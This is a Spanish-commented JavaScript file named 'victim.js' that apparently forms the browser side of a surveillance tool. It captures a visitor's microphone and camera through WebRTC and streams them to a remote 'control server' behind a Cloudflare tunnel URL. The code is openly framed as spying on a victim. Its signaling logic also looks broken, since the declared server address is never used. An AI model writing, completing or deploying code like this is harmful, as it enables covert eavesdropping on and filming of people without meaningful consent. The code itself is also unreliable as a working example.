// victim.js
const micButton = document.getElementById('micButton');
const cameraButton = document.getElementById('cameraButton');
const localVideo = document.getElementById('localVideo');
const localAudio = document.getElementById('localAudio');
const permissionArea = document.getElementById('permissionArea');
const permissionMessage = document.getElementById('permissionMessage');
const status = document.getElementById('status');

let peerConnection;
let dataChannel;
let isAudioEnabled = false;
let isCameraEnabled = false;

// Configuración del servidor de signaling
const signalingServer = 'wss://depot-gets-taken-oregon.trycloudflare.com'; // Cambia esto por tu servidor de signaling

// Configuración del ICE server (configura esto según tu entorno)
const iceServers = {
 iceServers: [
 { urls: 'stun:stun.l.google.com:19302' }
 ]
};

// Crear la conexión peer
async function createPeerConnection() {
 peerConnection = new RTCPeerConnection(iceServers);
 
 // Manejar el canal de datos
 dataChannel = peerConnection.createDataChannel('control');
 setupDataChannel(dataChannel);
 
 // Manejar recepción de streams
 peerConnection.ontrack = (event) => {
 if (event.track.kind === 'video') {
 localVideo.srcObject = event.streams[0];
 } else if (event.track.kind === 'audio') {
 localAudio.srcObject = event.streams[0];
 }
 permissionArea.style.display = 'block';
 };
 
 // Manejar cambios ICE candidates
 peerConnection.onicecandidate = (event) => {
 if (event.candidate) {
 dataChannel.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
 }
 };
 
 // Manejar conexión establecida
 peerConnection.onconnectionstatechange = () => {
 status.textContent = `Estado de conexión: ${peerConnection.connectionState}`;
 };
}

// Configurar el canal de datos
function setupDataChannel(channel) {
 channel.onopen = () => {
 console.log('Canal de datos abierto');
 status.textContent = 'Conexión establecida con el servidor de control';
 };
 
 channel.onmessage = (event) => {
 const message = JSON.parse(event.data);
 handleSignalingMessage(message);
 };
 
 channel.onerror = (error) => {
 console.error('Error en el canal de datos:', error);
 };
}

// Manejar mensajes de signaling
function handleSignalingMessage(message) {
 switch (message.type) {
 case 'offer':
 peerConnection.setRemoteDescription(new RTCSessionDescription(message.offer));
 peerConnection.createAnswer()
.then(answer => peerConnection.setLocalDescription(answer))
.then(() => {
 dataChannel.send(JSON.stringify({ type: 'answer', answer: peerConnection.localDescription }));
 });
 break;
 case 'answer':
 peerConnection.setRemoteDescription(new RTCSessionDescription(message.answer));
 break;
 case 'candidate':
 peerConnection.addIceCandidate(new RTCIceCandidate(message.candidate));
 break;
 }
}

// Habilitar micrófono
async function enableMicrophone() {
 if (isAudioEnabled) return;
 
 try {
 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
 localAudio.srcObject = stream;
 peerConnection.addTrack(stream.getAudioTracks()[0], stream);
 
 permissionMessage.textContent = 'Micrófono habilitado';
 isAudioEnabled = true;
 
 // Obtener la oferta
 const offer = await peerConnection.createOffer();
 await peerConnection.setLocalDescription(offer);
 
 // Enviar la oferta al servidor de signaling
 dataChannel.send(JSON.stringify({ type: 'offer', offer: peerConnection.localDescription }));
 } catch (error) {
 console.error('Error al habilitar el micrófono:', error);
 permissionMessage.textContent = 'Error al habilitar el micrófono: ' + error.message;
 }
}

// Habilitar cámara
async function enableCamera() {
 if (isCameraEnabled) return;
 
 try {
 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 localVideo.srcObject = stream;
 peerConnection.addTrack(stream.getVideoTracks()[0], stream);
 
 permissionMessage.textContent = 'Cámara habilitada';
 isCameraEnabled = true;
 
 // Obtener la oferta
 const offer = await peerConnection.createOffer();
 await peerConnection.setLocalDescription(offer);
 
 // Enviar la oferta al servidor de signaling
 dataChannel.send(JSON.stringify({ type: 'offer', offer: peerConnection.localDescription }));
 } catch (error) {
 console.error('Error al habilitar la cámara:', error);
 permissionMessage.textContent = 'Error al habilitar la cámara: ' + error.message;
 }
}

// Event listeners para los botones
micButton.addEventListener('click', enableMicrophone);
cameraButton.addEventListener('click', enableCamera);

// Inicializar la conexión peer cuando la página cargue
window.addEventListener('load', () => {
 createPeerConnection();
});
